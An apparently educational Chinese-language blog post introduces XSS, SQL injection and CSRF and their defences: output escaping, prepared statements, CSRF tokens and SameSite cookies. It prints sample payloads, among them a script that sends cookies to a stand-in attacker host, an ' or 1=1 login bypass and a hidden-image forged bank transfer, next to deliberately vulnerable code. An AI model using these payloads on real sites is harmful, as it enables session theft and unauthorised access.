---
title: 常見的網站攻擊方式
date: 2021-03-11 15:51:12
tags:
  - 資訊安全
  - XSS
  - SQL injection
  - CSRF
---

在討論常見的網站攻擊方式之前，可以先認識一下 **OWASP**。

> Open Web Application Security Project

[OWASP](https://owasp.org/) 是一個線上社群，介紹了各種不同的網路安全問題、每幾年的十大安全問題排名跟範例，完全免費，基本上是所有做資訊安全的聖經。

推薦 techbridge 的 [這篇文章](https://blog.techbridge.cc/2017/05/07/owasp/)，講了 2010 及 2013 的前十大網站攻擊排行，以及 [這篇](https://owasp.org/www-pdf-archive/OWASP_Top_10_2017_%E4%B8%AD%E6%96%87%E7%89%88v1.2.pdf) 是官方在 2017 年十大攻擊手法的中文版本。

## XSS

> Cross-Site-Scripting，俗稱 JavaScript Injection，中文被翻成跨站式腳本攻擊或是跨站攻擊。

XSS 是在使用者可操控的地方，像是留言內容、帳號名稱等地方，惡意寫入程式碼，讓網站載入這些內容時，一起執行這些程式。

常見的可能就是透過插入一個圖片，圖片會自動訪問 hackerhome 上的 grabber.jsp，並將使用者的 cookie 作為 msg 的值，讓受害者的 cookie 遭盜用。

```javascript
<script>document.write('<img src=http://www.hackerhome.com/grabber.jsp?msg=' document.cookie '
2     width=0 height=0 border=0 />SomeStore');</script>
```

所以要做的事情，就是防範讓伺服器知道這並不是程式碼，而只是一般的文字。可以透過 php 內建的 `htmlspecialchars` 達成這件事。

但要特別注意的是，並不是像 hash 一樣，在輸入密碼後就馬上處理並將 hash 過的內容存在資料庫，而是儲存原本的字元在資料庫，輸出時再經由`htmlspecialchars` 轉化。因為輸入防不勝防，直接解決輸出才能打到痛點。

```php utils.php
<?php
function escape($str) { // 之後就可以呼叫 escape()
  return htmlspecialchars($str, ENT_QUOTES);
}
?>
```

```php index.php
<?php
echo "<div class='comment__info--name'>" . escape($row['nickname']) . "</div>";
echo "<textarea class='comment__text'>" . escape($row['text']) . "</textarea>";
?>
```

### 儲存型

> stored XSS，或被稱為 persisted XSS

以輸入惡意、並會儲存到資料庫的資料方式攻擊，這種稱為儲存型 XSS，也就是前面提到的攻擊方式。

一般多以這種攻擊方式，因為這種攻擊方式的網址正常，只要成功攻擊，一般使用者只要點入就很有可能被竊取資料、或是被轉到其他網站。

### 反射型

> Reflected XSS

反射型是利用有些網站會將 query string 的內容，直接顯示在螢幕上作為提示文字，竄改 query string 的內容，將惡意程式碼放入 query string 達到攻擊目的。

但這種方式需要刻意讓使用者點選帶有奇怪程式碼的網址，所以一般比較少見。

### DOM XSS

> DOM-Based XSS（基於 DOM 的 XSS 類型）

透過程式碼當中 DOM 節點的 `.html` 或是 `.innerHtml` 漏洞，即可輸入 HTML 標籤，也就是可輸入 `<script>` `<img>` 標籤，將惡意程式碼帶入。

跟前面兩種 XSS 攻擊手法比較不一樣，前面兩種主要防範方式都是從後端，但 DOM XSS 從前端就可以簡單防範，直接看範例：

```html
<h3>Hi，<span class="show_name"></span></h3>
<!-- 這裡會顯示輸入的名稱 -->
<input id="name" type="text" />
<!-- 輸入名稱 -->
<button onClick="createText();">Say Hi</button>
<!-- 執行 createText() -->

<script>
  let createText = () => {
    let name = document.querySelector("#name");
    document.querySelector(".show_name").innerHTML = name; // 漏洞在這裡
  };
</script>
```

如果沒有檢查輸入，輸入可填入以下內容即可輕鬆執行程式碼。

```
<img src=# onerror="alert(123)" />
```

解決方法其實很簡單，只要把 `.html` 或是 `.innerHtml` 都改成 `.text` 及 `innerText` 就可以了。

## SQL Injection

> 被譯為 SQL 注入或是 SQL 隱碼

SQL Injection 一直是 OWASP 的常勝軍。使用的原理也相似，都是透過原本應該輸入文字或帳密等欄位，輸入了程式碼進去。

跟 XSS 不一樣的是，SQL Injection 是輸入 SQL 的語法，而 XSS 多半是輸入 JS 及 HTML 的語法。

一個有會員登入功能的網站，都會需要輸入帳號與密碼來進行驗證。而後端程式，如 PHP 就必需支援相關的登入檢查，判定 User 輸入的帳號、密碼是否正確，來確定登入是否成功。

```sql
select * from members where account='$name' and password='$password'
```

但若是駭客輸入有特殊字元的帳號：「 ' or 1=1 /\* 」，密碼：「任意值」，這時 SQL 語法就會變成：

```sql
select * from members where account='' or 1=1 /*' and password=''
/*
where 條件變成 account = 空值或是 1=1 是 true 的話
1=1 一定是 true 所以就可以成功登入
而且會發現後面被註解掉了
（透過這樣拿到的值通常是資料表第一筆）
```

這時候可以透過 MySQL 內建的語法 **Prepared Statements** 來解決這個問題。

```php add.php
<?php
// 原本用 sprintf() 拼接，現在刪掉並將變數值換成 ?
$sql = "INSERT INTO yu_comments(user_id, text) VALUES (?, ?)";
// stmt 是 statement 的常見縮寫
$stmt = $conn->prepare($sql);
// 將參數依序放進，第一個代表有兩個參數，一個是 i (interger)，一個是 s (string)
$stmt->bind_param('is', $user_id, $text);
// 最後執行
$result = $stmt->execute();

//...其他照常...
?>
```

```php login.php
<?php
//...上面照常...

  // 改成問號
  $sql =  "SELECT * FROM yu_users WHERE username=?"
  $stmt = $conn->prepare($sql);
  // 只有一個字串
  $stmt->bind_param('s', $username);
  $result = $stmt->execute();

  if(!$result) {
    die($conn->error);
  }

  // 這裡記得要透過 get_result() 拿到資料
  $result = $stmt->get_result();
  // 這裡開始底下如舊
  if ($result->num_rows === 0) {
    header('Location: login_page.php?errcode=2');
    exit();
  }

  $row = $result->fetch_assoc();
  if (password_verify($password, $row['password'])) {
    $_SESSION['username'] = $username;
    header('Location: index.php');
  } else {
    header('Location: login_page.php?errcode=2');
  }
?>
```

幾件事情要注意：

- 只要有 SQL 語法都要改成 prepared statements。
- 透過 `bind_param()` 拼接時記得第一個參數，如果要拼接三個字串是 `'sss'`; 第一個是字串第二個是整數第三個是字串是 `'sis'`。

## CSRF

> Cross Site Request Forgery，跨站請求偽造

假設我們今天登入 A 網站後沒有自行登出，A 網站會透過 Cookie 記住身分，讓我們下次進入網站的時候不需要再登入一次。但駭客其實可以透過這點，讓你誤點選設計好的 B 網站，透過在進入 B 網站時自動發送假的 request 到 A 網站，A 網站的 Server 端會以為這是我們本人發送的，就可以成功執行 request。

舉例來說，假設我們今天登入了 mybank.com 網站後沒有登出，只要有心人士惡意讓我們點了 myvideo.com 網站：

```html
<img src="https://mybank.com/transfer?id=11&amount=100" width="0" height="0" />
<a href="https://myvideo.com">影片連結</a>
```

如果網站沒有做其他驗證的話，其實很有可能就可以直接轉帳出去了。

### Double Submit Cookie

駭客跟使用者是使用不同的網域，也就是說駭客沒有辦法設定該網域的 Cookie，所以其實可以透過這一點來防範這件事。

由 client side 來生 CSRF token，並且把這個 CSRF token 放進表單及 Cookie 中，在收到 request 的時候 server 再去比對是否有值且相同。

但這還是有可能會遭到破解，如果駭客進入到了子網域中，根據 Cookie 設定規範，子網域能夠存取父網域的 Cookie，還是有可能可以成功被破解。

### Samesite

瀏覽器本身就有提供防範 CSRF 的機制，而且很簡單。只要在設定 Cookie 的時候多加一個 SameSite 就好了，用意是讓 Cookie 只允許 same site 使用，不應該在任何的跨網域的 request 被加上去。

```
Set-Cookie: session_id=ewfewjf23o1; SameSite // 預設模式為 SameSite=strict
Set-Cookie: session_id=ewfewjf23o1; SameSite=Lax // 或是自行設定為 Lax
```

透過瀏覽器設定的方式是目前最推薦的做法，`Lax` 與 `strict` 的差別，及更詳細資訊可參考 [這篇文章](https://blog.techbridge.cc/2017/02/25/csrf-introduction/)，這邊的筆記也都是參考此篇文章的。

## 有趣的測試小遊戲

這幾個遊戲都是讓你練習該如何學習駭客透過 XSS 及其他方式執行程式碼。

- https://xss-game.appspot.com/ ([解題影片](https://www.youtube.com/watch?v=MMMkvHwqPRY))
- http://xss-quiz.int21h.jp/ (可能會被 chrome 擋下來，可以試著用其他瀏覽器玩)
- http://www.hackertest.net/

## 資料來源

- [【網頁安全】給網頁開發新人的 XSS 攻擊介紹與防範](https://forum.gamer.com.tw/Co.php?bsn=60292&sn=11267)
- [SQL Injection 常見的駭客攻擊方式](https://www.puritys.me/docs-blog/article-11-SQL-Injection-%E5%B8%B8%E8%A6%8B%E7%9A%84%E9%A7%AD%E5%AE%A2%E6%94%BB%E6%93%8A%E6%96%B9%E5%BC%8F.html)

## 補充資料

- [前端安全系列（一）：如何防止 XSS 攻击？](https://segmentfault.com/a/1190000016551188)
- [一次看懂 SQL Injection 的攻擊原理](https://medium.com/@jaydenlin/%E6%B7%BA%E8%AB%87%E9%A7%AD%E5%AE%A2%E6%94%BB%E6%93%8A-%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8-%E4%B8%80%E6%AC%A1%E7%9C%8B%E6%87%82-sql-injection-%E7%9A%84%E6%94%BB%E6%93%8A%E5%8E%9F%E7%90%86-b1994fd2392a)
